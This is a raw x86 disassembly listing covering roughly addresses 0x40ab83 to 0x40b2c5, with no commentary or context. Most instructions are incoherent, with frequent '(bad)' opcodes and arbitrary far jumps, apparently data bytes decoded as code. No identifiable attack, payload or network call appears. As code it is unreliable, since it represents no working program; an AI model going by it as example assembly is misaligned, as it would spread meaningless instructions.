  40ab83:	sar    BYTE PTR [ecx+0xbda722],0x0
  40ab8a:	add    BYTE PTR [eax],al
  40ab8c:	add    BYTE PTR [eax-0x1c2b5f00],bh
  40ab92:	hlt    
  40ab93:	arpl   WORD PTR [edi+0x11],si
  40ab96:	clc    
  40ab97:	retf   0x6d32
  40ab9a:	in     al,dx
  40ab9b:	mul    BYTE PTR [ecx+0x5f]
  40ab9e:	add    esi,0x1d
  40aba1:	arpl   di,dx
  40aba3:	shl    BYTE PTR [edx],1
  40aba5:	jo     0x40ab8f
  40aba7:	sbb    ebx,DWORD PTR [edi+0x2c]
  40abaa:	out    dx,al
  40abab:	add    bl,BYTE PTR [edx]
  40abad:	push   edi
  40abae:	jmp    0x40abba
  40abb0:	xor    ecx,edi
  40abb2:	fwait
  40abb3:	sbb    BYTE PTR [eax+eax*8],ah
  40abb6:	fild   WORD PTR [esi+esi*8]
  40abb9:	mov    cl,bh
  40abbb:	ficom  DWORD PTR [ebx]
  40abbd:	xchg   dh,dl
  40abbf:	fimul  DWORD PTR [eax]
  40abc1:	xchg   ebp,eax
  40abc2:	(bad)  
  40abc3:	aam    0xff
  40abc5:	addr16 (bad) 
  40abc7:	mov    ds:0xf0b29605,eax
  40abcc:	sub    eax,0x3e0b78d
  40abd1:	aam    0x7d
  40abd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd4:	cld    
  40abd5:	xchg   edx,eax
  40abd6:	rcr    DWORD PTR [eax-0x25297895],0x10
  40abdd:	nop
  40abde:	mov    dl,0x25
  40abe0:	mov    ebp,0xc3eff641
  40abe5:	push   eax
  40abe6:	or     ebp,ecx
  40abe8:	(bad)  
  40abe9:	cld    
  40abea:	or     eax,0xfb4bccbd
  40abef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf0:	int    0x0
  40abf2:	add    BYTE PTR [eax],al
  40abf4:	add    BYTE PTR [eax],al
  40abf6:	sbb    BYTE PTR [edi],al
  40abf8:	mov    ebx,0xae07e0c2
  40abfd:	(bad)  
  40abfe:	adc    al,bh
  40ac00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac01:	mov    esi,0xbd0f0bc5
  40ac06:	loopne 0x40ac2a
  40ac08:	mov    ebx,0xb862236c
  40ac0d:	xchg   edi,eax
  40ac0e:	xor    eax,0x175aa67
  40ac13:	pop    ds
  40ac14:	out    0x89,al
  40ac16:	mov    ebp,0xe69af908
  40ac1b:	adc    eax,0x2de556a5
  40ac20:	out    dx,al
  40ac21:	jg     0x40abcb
  40ac23:	push   ds
  40ac24:	not    DWORD PTR [edx+0x6a98342c]
  40ac2a:	daa    
  40ac2b:	aaa    
  40ac2c:	lea    edi,[edx]
  40ac2e:	daa    
  40ac2f:	dec    edi
  40ac30:	xchg   esi,eax
  40ac31:	jge    0x40abfc
  40ac33:	pop    es
  40ac34:	aad    0x3d
  40ac36:	inc    esi
  40ac37:	or     al,0xe4
  40ac39:	inc    edx
  40ac3a:	xchg   ebx,eax
  40ac3b:	mov    dl,0xe
  40ac3d:	loope  0x40abdd
  40ac3f:	fbstp  TBYTE PTR [edx]
  40ac41:	add    DWORD PTR [ebp+0x64d625ef],ebx
  40ac47:	fsubr  DWORD PTR [ebx]
  40ac49:	hlt    
  40ac4a:	mov    ch,al
  40ac4c:	and    esp,esp
  40ac4e:	test   DWORD PTR [ebp-0x158627e3],esi
  40ac54:	and    ah,dl
  40ac56:	jl     0x40ac2d
  40ac58:	jle    0x40ac55
  40ac5a:	add    BYTE PTR [eax],al
  40ac5c:	add    BYTE PTR [eax],al
  40ac5e:	add    BYTE PTR [ebp-0x7412c92b],bl
  40ac64:	mov    esi,0xbe70ba14
  40ac69:	or     esp,esp
  40ac6b:	xchg   ebx,eax
  40ac6c:	mov    dl,0xe
  40ac6e:	sbb    BYTE PTR [ecx+ecx*4+0x43],0x33
  40ac73:	xchg   ebx,eax
  40ac74:	sahf   
  40ac75:	push   edx
  40ac76:	xor    al,0x5a
  40ac78:	mov    dl,0xe
  40ac7a:	dec    edi
  40ac7b:	iret   
  40ac7c:	or     DWORD PTR [edi+eiz*1-0x43],0x48005771
  40ac84:	test   DWORD PTR [eax+0x5d],ebx
  40ac87:	ret    0x46eb
  40ac8a:	push   ebp
  40ac8b:	mov    edx,0x866f73e6
  40ac90:	jmp    0xe53:0x7daa5048
  40ac97:	test   esi,esp
  40ac99:	push   ebx
  40ac9a:	inc    esi
  40ac9b:	mov    ds:0xa4647c9c,eax
  40aca0:	jbe    0x40ad15
  40aca2:	jnp    0x40ac4b
  40aca4:	mov    bh,BYTE PTR [eax+0x70]
  40aca7:	mov    bh,0x71
  40aca9:	jl     0x40ad21
  40acab:	test   al,0x96
  40acad:	jns    0x40acaf
  40acaf:	xor    al,0x6b
  40acb1:	aad    0xd9
  40acb3:	pop    ecx
  40acb4:	outs   dx,BYTE PTR ds:[esi]
  40acb5:	(bad)  
  40acb6:	add    BYTE PTR ds:0xc0d0ddf4,bh
  40acbc:	gs fucom st(0)
  40acbf:	clc    
  40acc0:	mov    dh,0xe
  40acc2:	add    BYTE PTR [eax],al
  40acc4:	add    BYTE PTR [eax],al
  40acc6:	add    BYTE PTR [eax],al
  40acc8:	xor    eax,0x35786396
  40accd:	mov    al,ds:0x80026d73
  40acd2:	bound  esp,QWORD PTR [edi+0x28]
  40acd5:	mov    ds:0x9d306f7c,al
  40acda:	dec    ebp
  40acdb:	push   ebp
  40acdc:	cld    
  40acdd:	mov    al,ds:0x88206a72
  40ace2:	ins    DWORD PTR es:[edi],dx
  40ace3:	xor    al,0xff
  40ace5:	pushf  
  40ace6:	ins    DWORD PTR es:[edi],dx
  40ace7:	jl     0x40acd2
  40ace9:	out    dx,al
  40acea:	inc    esi
  40aceb:	pop    esi
  40acec:	mov    esi,0x841538d
  40acf1:	jl     0x40ad3b
  40acf3:	pop    ebp
  40acf4:	cmp    DWORD PTR [ebx-0x7928fff2],esi
  40acfa:	je     0x40ad7b
  40acfc:	mov    esi,0x90757aef
  40ad01:	xchg   DWORD PTR [ebp+0x72],ebp
  40ad04:	ins    DWORD PTR es:[edi],dx
  40ad05:	sbb    DWORD PTR [eax+eax*1],ecx
  40ad08:	nop
  40ad09:	sbb    ebp,DWORD PTR ds:0x15bbae35
  40ad0f:	and    eax,0x31f71ea3
  40ad14:	test   eax,0xa12c1930
  40ad19:	add    BYTE PTR [eax],bl
  40ad1b:	pop    ds
  40ad1c:	jge    0x40ad1b
  40ad1e:	and    DWORD PTR [ebx],esp
  40ad20:	jns    0x40ad29
  40ad22:	adc    DWORD PTR [edi],edx
  40ad24:	cdq    
  40ad25:	add    DWORD PTR [esi],ebp
  40ad27:	cmp    eax,0x2508186b
  40ad2c:	add    BYTE PTR [eax],al
  40ad2e:	add    BYTE PTR [eax],al
  40ad30:	add    BYTE PTR [edi-0x76e1fae8],bl
  40ad36:	adc    BYTE PTR [eax],ch
  40ad38:	xor    bh,BYTE PTR [edx+edx*1-0xd]
  40ad3c:	or     al,0x80
  40ad3e:	sbb    eax,0x196142f8
  40ad43:	cld    
  40ad44:	adc    bl,BYTE PTR [edi-0x41e7e2e4]
  40ad4a:	les    eax,FWORD PTR [edi]
  40ad4c:	add    DWORD PTR [ebx-0x10c9c007],ecx
  40ad52:	sbb    ecx,DWORD PTR [eax+eax*1]
  40ad55:	nop
  40ad56:	mov    ?,WORD PTR [edx-0x6b]
  40ad59:	add    DWORD PTR [esp+ecx*1],ebx
  40ad5c:	add    BYTE PTR [eax-0x33b3bc9c],dl
  40ad62:	sbb    ecx,DWORD PTR [eax+eax*1]
  40ad65:	nop
  40ad66:	test   eax,0xc837fac2
  40ad6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad6c:	mov    ebp,0xff70b8fa
  40ad71:	aaa    
  40ad72:	pop    eax
  40ad73:	stc    
  40ad74:	pop    ebp
  40ad75:	xlat   BYTE PTR ds:[ebx]
  40ad76:	or     eax,0xf90007e
  40ad7b:	sbb    DWORD PTR [edi],esi
  40ad7d:	popa   
  40ad7e:	mov    dl,0x16
  40ad80:	sbb    eax,0x200ba669
  40ad85:	mov    ch,0xe7
  40ad87:	add    bl,BYTE PTR [eax+eax*8]
  40ad8a:	ror    BYTE PTR [ecx+edx*1-0x3f],cl
  40ad8e:	jmp    0x6cf6:0xdbb72304
  40ad95:	add    BYTE PTR [eax],al
  40ad97:	add    BYTE PTR [eax],al
  40ad99:	add    BYTE PTR [ecx-0x2f],dh
  40ad9c:	or     eax,0xbfdfb62b
  40ada1:	or     dl,BYTE PTR [ebx-0x60]
  40ada4:	dec    ebx
  40ada5:	das    
  40ada6:	nop
  40ada7:	mov    dl,0x99
  40ada9:	mov    edi,0x4a9f4d2
  40adae:	nop
  40adaf:	mov    dl,0x60
  40adb1:	fcomp  DWORD PTR [ebx+ecx*2]
  40adb4:	mov    ds:0x31b2cecc,eax
  40adb9:	adc    BYTE PTR [ebx+esi*4],0xe3
  40adbd:	xor    BYTE PTR [esi-0x14],dh
  40adc0:	leave  
  40adc1:	sub    BYTE PTR [esi+ebx*8+0x17],ch
  40adc5:	sub    DWORD PTR [ecx-0x50],edi
  40adc8:	add    BYTE PTR ds:0x11d8dac2,ah
  40adce:	shr    edi,0x3
  40add1:	and    DWORD PTR [ebx-0x5eff2e4e],ebp
  40add7:	mov    al,0xcf
  40add9:	or     BYTE PTR [eax-0x65fe1b3a],cl
  40addf:	test   edx,eax
  40ade1:	add    DWORD PTR [esi-0x4e],edi
  40ade4:	call   0x9003:0xc0d99e6b
  40adeb:	mov    dl,0x7e
  40aded:	stos   BYTE PTR es:[edi],al
  40adee:	icebp  
  40adef:	pop    edx
  40adf0:	dec    ebx
  40adf1:	mov    al,ds:0xa5611afa
  40adf6:	pop    ss
  40adf7:	gs dec ecx
  40adf9:	xchg   esp,eax
  40adfa:	loop   0x40ae0e
  40adfc:	andnps xmm0,XMMWORD PTR [eax]
  40adff:	add    BYTE PTR [eax],al
  40ae01:	add    BYTE PTR [eax],al
  40ae03:	cld    
  40ae04:	pop    edi
  40ae05:	mov    ecx,0xeb293e9
  40ae0a:	(bad)  [eax]
  40ae0c:	push   ss
  40ae0d:	stc    
  40ae0e:	fcomi  st,st(6)
  40ae10:	and    eax,0xf2eedcec
  40ae15:	lds    ebp,FWORD PTR [esi-0x6131f72c]
  40ae1b:	iret   
  40ae1c:	sbb    ebp,edx
  40ae1e:	mov    ch,0xc9
  40ae20:	pop    ss
  40ae21:	std    
  40ae22:	mov    esp,0xa0d417bf
  40ae27:	daa    
  40ae28:	sub    eax,0xba8406f0
  40ae2d:	or     bl,ch
  40ae2f:	jnp    0x40ae03
  40ae31:	push   cs
  40ae32:	or     BYTE PTR [edx-0x78],dl
  40ae35:	pop    ebp
  40ae36:	sub    al,0x48
  40ae38:	jno    0x40ae57
  40ae3a:	add    al,0x7c
  40ae3c:	add    BYTE PTR [ebp+0x22],0x6c
  40ae40:	jle    0x40ae86
  40ae42:	jmp    0xbf4f60da
  40ae47:	pop    ecx
  40ae48:	(bad)  
  40ae49:	push   edx
  40ae4a:	ret    0xb264
  40ae4d:	push   cs
  40ae4e:	into   
  40ae4f:	loop   0x40adef
  40ae51:	push   cs
  40ae52:	push   cs
  40ae53:	mov    ds:0xa9e306b1,al
  40ae58:	mov    dl,0xd
  40ae5a:	loope  0x40adfd
  40ae5c:	(bad)  
  40ae5d:	adc    al,0xc
  40ae5f:	xchg   esp,eax
  40ae60:	mov    dl,0xd
  40ae62:	fisub  WORD PTR [ebx-0x50]
  40ae65:	push   ss
  40ae66:	rol    BYTE PTR [eax],1
  40ae68:	add    BYTE PTR [eax],al
  40ae6a:	add    BYTE PTR [eax],al
  40ae6c:	pop    edx
  40ae6d:	mov    DWORD PTR [esi],edi
  40ae6f:	(bad)  
  40ae70:	push   ebp
  40ae71:	ret    
  40ae72:	sbb    esi,ebx
  40ae74:	dec    esp
  40ae75:	(bad)  
  40ae76:	dec    ebp
  40ae78:	mov    ds:0xa58a14df,eax
  40ae7d:	leave  
  40ae7e:	add    BYTE PTR fs:[edx-0x1d],al
  40ae82:	and    bh,BYTE PTR [ebx]
  40ae84:	inc    edx
  40ae85:	int3   
  40ae86:	das    
  40ae87:	add    BYTE PTR [ebp+0x16],bh
  40ae8a:	jmp    0xf249387b
  40ae8f:	lods   al,BYTE PTR ds:[esi]
  40ae90:	fisttp WORD PTR [edi]
  40ae92:	call   0xd0abc583
  40ae97:	out    0xeb,eax
  40ae99:	sbb    al,ah
  40ae9b:	std    
  40ae9c:	fcomp  DWORD PTR [eax]
  40ae9e:	loop   0x40aea0
  40aea0:	aam    0xdd
  40aea2:	and    dh,BYTE PTR ds:0x7d37bfe8
  40aea8:	(bad)  
  40aea9:	fsubr  DWORD PTR [esi]
  40aeab:	and    ebx,edx
  40aead:	shl    DWORD PTR [edi],cl
  40aeaf:	jne    0x40ae42
  40aeb1:	fsub   QWORD PTR [ebx]
  40aeb3:	and    bh,ch
  40aeb5:	aad    0x25
  40aeb7:	and    esp,edi
  40aeb9:	mov    edi,0x9f51000e
  40aebe:	sahf   
  40aebf:	mov    BYTE PTR ds:0x43c08641,bh
  40aec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec6:	xchg   edx,eax
  40aec7:	sahf   
  40aec8:	das    
  40aec9:	lods   eax,DWORD PTR ds:[esi]
  40aeca:	xchg   ebp,eax
  40aecb:	add    cl,bh
  40aecd:	pop    edi
  40aece:	rcr    ch,0x0
  40aed1:	add    BYTE PTR [eax],al
  40aed3:	add    BYTE PTR [eax],al
  40aed5:	imul   ebp,DWORD PTR [eax-0x33],0x9afa0acd
  40aedc:	aad    0xc1
  40aede:	icebp  
  40aedf:	rcr    ebp,cl
  40aee1:	lahf   
  40aee2:	imul   eax,ebx,0xeaf69d6
  40aee8:	add    BYTE PTR [ebp+0x6d081525],bl
  40aeee:	sub    BYTE PTR ds:0x12c7921d,al
  40aef4:	pop    ss
  40aef5:	push   0x401f0cb2
  40aefa:	sub    DWORD PTR [edi],edi
  40aefc:	cmp    edx,DWORD PTR [eax-0x68f2f7e9]
  40af02:	sub    edi,esi
  40af04:	inc    esp
  40af05:	imul   edx,DWORD PTR [edi],0x5b900d05
  40af0b:	pop    ebp
  40af0c:	jns    0x40aec8
  40af0e:	xor    edx,DWORD PTR [ebx+0x69]
  40af11:	lahf   
  40af12:	push   edx
  40af13:	xor    edi,DWORD PTR [esi-0x63]
  40af16:	js     0x40af67
  40af18:	pusha  
  40af19:	lea    eax,[eax+0x79695352]
  40af1f:	push   0x5787756f
  40af24:	daa    
  40af25:	dec    edx
  40af26:	sbb    DWORD PTR [eax+0x66],0x564de9b2
  40af2d:	inc    edx
  40af2e:	sbb    DWORD PTR [eax+eax*1],ecx
  40af31:	nop
  40af32:	call   0x85d8:0x8833bea8
  40af39:	add    BYTE PTR [eax],al
  40af3b:	add    BYTE PTR [eax],al
  40af3d:	add    BYTE PTR [edx],cl
  40af3f:	xchg   BYTE PTR [eax-0x73773801],ah
  40af45:	mov    WORD PTR [ecx+ebx*1],fs
  40af48:	or     al,0x0
  40af4a:	nop
  40af4b:	outs   dx,BYTE PTR ds:[esi]
  40af4c:	push   eax
  40af4d:	and    ah,BYTE PTR ds:0x90000c19
  40af53:	ja     0x40aee3
  40af55:	cwde   
  40af56:	add    bh,BYTE PTR [ebx-0x78]
  40af59:	jg     0x40af1d
  40af5b:	dec    eax
  40af5c:	(bad)  
  40af5d:	xchg   ebp,eax
  40af5e:	and    bl,BYTE PTR [esp+ecx*1]
  40af61:	add    BYTE PTR [eax-0x7a022a2a],dl
  40af67:	sub    ebx,0xffffffe6
  40af6a:	cmp    eax,0x6cedddca
  40af6f:	stos   BYTE PTR es:[edi],al
  40af70:	mov    ebp,0xb725cfc
  40af75:	add    BYTE PTR [eax-0x1198a1bc],dl
  40af7b:	mov    dl,0x94
  40af7d:	push   edi
  40af7e:	lds    eax,FWORD PTR [edx-0x653ca06e]
  40af84:	xchg   ecx,eax
  40af85:	outs   dx,BYTE PTR ds:[esi]
  40af86:	nop
  40af87:	mov    dl,0xe7
  40af89:	sub    BYTE PTR [esi-0x23],ch
  40af8c:	scas   eax,DWORD PTR es:[edi]
  40af8d:	das    
  40af8e:	gs leave 
  40af90:	out    0x2e,al
  40af92:	jo     0x40af6f
  40af94:	in     eax,0x3
  40af96:	nop
  40af97:	mov    dl,0xc3
  40af99:	and    BYTE PTR [edi-0x2c],ch
  40af9c:	sbb    edx,DWORD PTR [ebx]
  40af9e:	stos   BYTE PTR es:[edi],al
  40af9f:	shl    ebp,0xf7
  40afa2:	add    BYTE PTR [eax],al
  40afa4:	add    BYTE PTR [eax],al
  40afa6:	add    BYTE PTR [ebx-0x73040113],dh
  40afac:	int    0xf3
  40afae:	lock imul DWORD PTR [ecx]
  40afb1:	imul   ecx,edx,0xffffffea
  40afb4:	or     dl,BYTE PTR [ecx-0x5dfc254e]
  40afba:	jae    0x40af77
  40afbc:	add    al,0x9f
  40afbe:	mov    ah,0xb
  40afc0:	inc    edx
  40afc1:	jnp    0x40af7d
  40afc3:	das    
  40afc4:	sbb    DWORD PTR [edi-0x3c],esp
  40afc7:	(bad)  
  40afc8:	lock test eax,0xb9311179
  40afce:	lods   eax,DWORD PTR ds:[esi]
  40afcf:	mov    bh,0x29
  40afd1:	popf   
  40afd2:	mov    al,ds:0x7ca4f1a5
  40afd7:	hlt    
  40afd8:	ins    DWORD PTR es:[edi],dx
  40afd9:	mov    ss:0xe68429e5,al
  40afdf:	loop   0x40b00e
  40afe1:	ins    DWORD PTR es:[edi],dx
  40afe2:	stos   BYTE PTR es:[edi],al
  40afe3:	mov    BYTE PTR [eax+0x36],bl
  40afe6:	mov    dl,0x14
  40afe8:	pop    esp
  40afe9:	xchg   ebp,eax
  40afea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afeb:	cmp    DWORD PTR [esi-0x7f],ebx
  40afee:	xchg   esi,eax
  40afef:	imul   esp,DWORD PTR [ebx],0xe75803d
  40aff5:	mov    WORD PTR [edx+0x580f4c0a],cs
  40affb:	or     al,0x3f
  40affd:	mov    ss,WORD PTR [ecx]
  40afff:	push   ecx
  40b000:	out    dx,al
  40b001:	pushf  
  40b002:	sbb    eax,0x2d0eb294
  40b007:	leave  
  40b008:	gs mov dh,0x61
  40b00b:	add    BYTE PTR [eax],al
  40b00d:	add    BYTE PTR [eax],al
  40b00f:	add    BYTE PTR [esi-0x73857bb6],bh
  40b015:	mov    dl,0xe
  40b017:	cdq    
  40b018:	xchg   esp,eax
  40b019:	fisubr DWORD PTR [ebx]
  40b01b:	jmp    0x40b03b
  40b01d:	mov    dl,0x21
  40b01f:	mov    edx,0xe913c31e
  40b024:	xchg   ebx,eax
  40b025:	mov    dl,0xe
  40b027:	sbb    eax,0x554c7671
  40b02c:	ins    DWORD PTR es:[edi],dx
  40b02d:	mov    gs,WORD PTR [ebp+0x5f]
  40b030:	push   0xffffffa9
  40b032:	es jmp 0x904f62cb
  40b038:	int    0x1
  40b03a:	rol    dh,1
  40b03c:	enter  0xf26,0x55
  40b040:	enter  0xe614,0x91
  40b044:	adc    al,0xfb
  40b046:	ret    0xbcbd
  40b049:	sbb    dl,dl
  40b04b:	ret    0x309
  40b04e:	fidiv  DWORD PTR [edx+edx*8-0x6c16350c]
  40b055:	mov    dl,0xe
  40b057:	dec    esi
  40b058:	or     edx,DWORD PTR [ebx-0x58]
  40b05b:	jmp    0x2a4f62f3
  40b060:	pop    edi
  40b061:	jae    0x40b08e
  40b063:	jmp    0x8c4f62fb
  40b068:	xor    ebx,DWORD PTR [ecx-0x50]
  40b06b:	jmp    0xf94f6303
  40b070:	jp     0x40b005
  40b072:	outs   dx,BYTE PTR ds:[esi]
  40b073:	rol    DWORD PTR [eax],1
  40b075:	add    BYTE PTR [eax],al
  40b077:	add    BYTE PTR [eax],al
  40b079:	ja     0x40b0a3
  40b07b:	lock add BYTE PTR [eax-0x47223a9b],dh
  40b082:	out    dx,al
  40b083:	int3   
  40b084:	fcomip st,st(3)
  40b086:	repz rol edx,1
  40b089:	imul   esi,DWORD PTR [esi+ecx*1+0x60872600],0xeb4396f
  40b094:	add    BYTE PTR [edi-0xc],ch
  40b097:	fcmovbe st,st(2)
  40b099:	jnp    0x40b0a2
  40b09b:	mov    dl,cl
  40b09d:	sub    BYTE PTR [edx],bh
  40b09f:	aam    0xf1
  40b0a1:	mov    ch,0xab
  40b0a3:	xchg   esi,eax
  40b0a4:	fist   WORD PTR [ebx+0x6d8488a4]
  40b0aa:	push   ss
  40b0ab:	call   0x46ce:0x9ef58082
  40b0b2:	out    dx,eax
  40b0b3:	out    dx,eax
  40b0b4:	(bad)  
  40b0b5:	fimul  WORD PTR [edi]
  40b0b7:	std    
  40b0b8:	icebp  
  40b0b9:	(bad)  
  40b0bb:	std    
  40b0bc:	add    BYTE PTR [ebp-0x4ca3a914],bh
  40b0c2:	outs   dx,DWORD PTR ds:[esi]
  40b0c3:	push   ebp
  40b0c4:	push   0xffffffb5
  40b0c6:	in     al,0x5e
  40b0c8:	push   esp
  40b0c9:	jnp    0x40b142
  40b0cb:	pop    ebp
  40b0cc:	add    BYTE PTR [ebx],ch
  40b0ce:	or     al,0xd0
  40b0d0:	loopne 0x40b0f1
  40b0d2:	adc    al,dh
  40b0d4:	jmp    FWORD PTR [edx-0x14]
  40b0d7:	push   ecx
  40b0d8:	pop    eax
  40b0d9:	test   eax,0xeb3
  40b0de:	add    BYTE PTR [eax],al
  40b0e0:	add    BYTE PTR [eax],al
  40b0e2:	leave  
  40b0e3:	je     0x40b0fa
  40b0e5:	push   ebp
  40b0e6:	mov    eax,esp
  40b0e8:	push   cs
  40b0e9:	add    BYTE PTR [edx+ebx*4-0x79848696],dl
  40b0f0:	js     0x40b170
  40b0f2:	pop    ebp
  40b0f3:	mov    bl,0xe
  40b0f5:	add    BYTE PTR [edi+eax*4+0x62],cl
  40b0f9:	jno    0x40b08b
  40b0fb:	arpl   WORD PTR [edi+0x63],bp
  40b0fe:	repnz add al,0x67
  40b101:	js     0x40b0ec
  40b103:	sbb    DWORD PTR [eax+eax*1],ecx
  40b106:	nop
  40b107:	and    ecx,0xd6c85ce0
  40b10d:	imul   DWORD PTR [edi+0x19]
  40b110:	or     al,0x0
  40b112:	nop
  40b113:	hlt    
  40b114:	xor    DWORD PTR [edx-0x29],edx
  40b117:	sub    eax,0x65dd4135
  40b11c:	dec    ecx
  40b11d:	inc    ecx
  40b11e:	loope  0x40b139
  40b120:	or     al,0x0
  40b122:	nop
  40b123:	outs   dx,DWORD PTR ds:[esi]
  40b124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b125:	mov    esi,ecx
  40b127:	in     eax,0xa9
  40b129:	mov    ds:0xb4a3e6e2,al
  40b12e:	nop
  40b12f:	pop    esp
  40b130:	ss jno 0x40b1a0
  40b133:	fidivr WORD PTR [edi]
  40b135:	inc    ebp
  40b136:	dec    esp
  40b137:	jmp    0xa3d0b146
  40b13c:	jge    0x40b0cb
  40b13e:	sub    al,0x92
  40b140:	js     0x40b0d8
  40b142:	add    DWORD PTR [esi+ecx*4+0x92],ebx
  40b149:	add    BYTE PTR [eax],al
  40b14b:	pop    es
  40b14c:	xchg   ecx,eax
  40b14d:	or     eax,DWORD PTR [eax]
  40b14f:	nop
  40b150:	ror    DWORD PTR [esi+0x5c],1
  40b153:	pop    esi
  40b154:	lds    eax,FWORD PTR [esi+0x73]
  40b157:	pop    esp
  40b158:	xlat   BYTE PTR ds:[ebx]
  40b159:	dec    ebx
  40b15a:	add    BYTE PTR [eax+0x59735fb0],dl
  40b160:	mov    esp,0xb1405c67
  40b165:	imul   esp,DWORD PTR [eax+0x28],0x90000abd
  40b16c:	dec    esi
  40b16d:	ret    
  40b16e:	rcr    BYTE PTR [ebx-0x3f2b41ad],1
  40b174:	dec    esi
  40b175:	int3   
  40b176:	(bad)  
  40b177:	pop    ecx
  40b178:	mov    bl,0x3d
  40b17a:	mov    ecx,0xc02ff77d
  40b17f:	arpl   bp,di
  40b181:	cmp    BYTE PTR [edx-0x5778d989],dh
  40b187:	and    al,0x46
  40b189:	cdq    
  40b18a:	xchg   ebp,eax
  40b18b:	and    BYTE PTR [edi-0x7c],bl
  40b18e:	lahf   
  40b18f:	xor    bl,BYTE PTR [eax-0x76]
  40b192:	popf   
  40b193:	add    DWORD PTR [ebx+eiz*2-0x6a],ebx
  40b197:	add    ah,BYTE PTR [edi+0x54]
  40b19a:	add    edx,DWORD PTR [eax+0x6f03f9b2]
  40b1a0:	mov    ebp,0xd887fcf8
  40b1a5:	cld    
  40b1a6:	cli    
  40b1a7:	mov    ecx,esp
  40b1a9:	sar    ch,cl
  40b1ab:	mov    WORD PTR [eax+0xf4e2],?
  40b1b1:	add    BYTE PTR [eax],al
  40b1b3:	add    BYTE PTR [ebx-0x6ffc1a40],dl
  40b1b9:	mov    dl,0x17
  40b1bb:	(bad)  
  40b1be:	retf   0xe1bd
  40b1c1:	sbb    dh,BYTE PTR [ebx-0x50f5213d]
  40b1c7:	retf   
  40b1c8:	fidiv  DWORD PTR [edx+0x2d378174]
  40b1ce:	push   esi
  40b1cf:	jne    0x40b1d0
  40b1d1:	push   edi
  40b1d2:	arpl   WORD PTR [edi+0xa],si
  40b1d5:	cmp    eax,0xb29003e6
  40b1da:	jae    0x40b16b
  40b1dc:	das    
  40b1dd:	pop    ebp
  40b1de:	mov    ah,BYTE PTR [edx-0x67929e0d]
  40b1e4:	icebp  
  40b1e5:	pop    edi
  40b1e6:	out    0x3,al
  40b1e8:	nop
  40b1e9:	mov    dl,0x83
  40b1eb:	fistp  QWORD PTR [edi-0x5a2545f4]
  40b1f1:	sbb    eax,0xb29adc76
  40b1f6:	push   cs
  40b1f7:	or     esi,DWORD PTR [edi]
  40b1f9:	mov    ds:0x9be11d68,al
  40b1fe:	jns    0x40b1e5
  40b200:	hlt    
  40b201:	fwait
  40b202:	jne    0x40b1ed
  40b204:	xchg   ebx,eax
  40b205:	mov    dl,0xe
  40b207:	outs   dx,BYTE PTR ds:[esi]
  40b208:	or     al,0x3e
  40b20a:	mov    WORD PTR [eax+0x589548e0],es
  40b210:	fiadd  WORD PTR [esi-0x7b]
  40b213:	mov    ah,bl
  40b215:	dec    edx
  40b216:	xchg   cl,ch
  40b218:	add    BYTE PTR [eax],al
  40b21a:	add    BYTE PTR [eax],al
  40b21c:	add    BYTE PTR [ebx-0x7570f14e],dl
  40b222:	jbe    0x40b278
  40b224:	cdq    
  40b225:	into   
  40b226:	jo     0x40b273
  40b228:	mov    cl,0xcc
  40b22a:	outs   dx,BYTE PTR ds:[esi]
  40b22b:	pop    ebx
  40b22c:	xchg   ecx,eax
  40b22d:	addr16 jb 0x40b275
  40b230:	mov    ch,0xd7
  40b232:	xchg   BYTE PTR [esi],cl
  40b234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b235:	fs je  0x40b28e
  40b238:	jnp    0x40b202
  40b23a:	js     0x40b28e
  40b23c:	pushf  
  40b23d:	pop    esp
  40b23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b23f:	dec    ecx
  40b240:	test   eax,0xf10eb2c3
  40b245:	cwde   
  40b246:	enter  0x702,0xfd
  40b24a:	mov    BYTE PTR [esi],0xe8
  40b24d:	nop
  40b24e:	fimul  DWORD PTR [edx]
  40b250:	cmc    
  40b251:	out    0xc8,al
  40b253:	or     dh,cl
  40b255:	xchg   ebx,eax
  40b256:	mov    dl,0xe
  40b258:	cli    
  40b259:	(bad)  
  40b25a:	shl    DWORD PTR [edi],cl
  40b25c:	aam    0x81
  40b25e:	loopne 0x40b281
  40b260:	fdiv   DWORD PTR [esi-0x2e]
  40b263:	sub    al,0xd0
  40b265:	jae    0x40b219
  40b267:	push   cs
  40b268:	sub    al,0x4e
  40b26a:	test   DWORD PTR [ebp+0xa],eax
  40b26d:	inc    esp
  40b26e:	jbe    0x40b2cb
  40b270:	(bad)  
  40b271:	outs   dx,DWORD PTR ds:[esi]
  40b272:	xchg   BYTE PTR [ebp+0x0],bl
  40b275:	jno    0x40b25b
  40b277:	pop    ecx
  40b278:	pop    esp
  40b279:	test   eax,0x73000eb0
  40b27e:	ins    DWORD PTR es:[edi],dx
  40b27f:	push   esi
  40b280:	dec    esi
  40b281:	add    BYTE PTR [eax],al
  40b283:	add    BYTE PTR [eax],al
  40b285:	add    BYTE PTR [ebp+0x4b5558dc],dl
  40b28b:	jb     0x40b2e7
  40b28d:	push   ebx
  40b28e:	inc    edi
  40b28f:	lea    ecx,[ebp+edx*2+0x42]
  40b293:	mov    al,0xe
  40b295:	add    BYTE PTR [ecx],dh
  40b297:	jnp    0x40b2ed
  40b299:	dec    esp
  40b29a:	push   edi
  40b29b:	fstp   QWORD PTR [eax+0x5b]
  40b29e:	std    
  40b29f:	out    0x5a,eax
  40b2a1:	pop    edx
  40b2a2:	add    ebp,edx
  40b2a4:	push   ecx
  40b2a5:	inc    esi
  40b2a6:	pop    ds
  40b2a7:	jg     0x40b2ef
  40b2a9:	dec    ebx
  40b2aa:	dec    esp
  40b2ab:	mov    al,0xe
  40b2ad:	add    BYTE PTR [ecx-0x3d],bl
  40b2b0:	sub    al,0x34
  40b2b2:	aas    
  40b2b3:	rcr    BYTE PTR [edi],cl
  40b2b5:	and    ebx,DWORD PTR [edi-0x3c]
  40b2b8:	das    
  40b2b9:	and    al,BYTE PTR [ecx-0x3f]
  40b2bc:	and    BYTE PTR [eax],bh
  40b2be:	and    edi,DWORD PTR [edi-0x4fd6ddc4]
  40b2c4:	push   cs
  40b2c5:	add    BYTE PTR [ebx-0x4b],cl
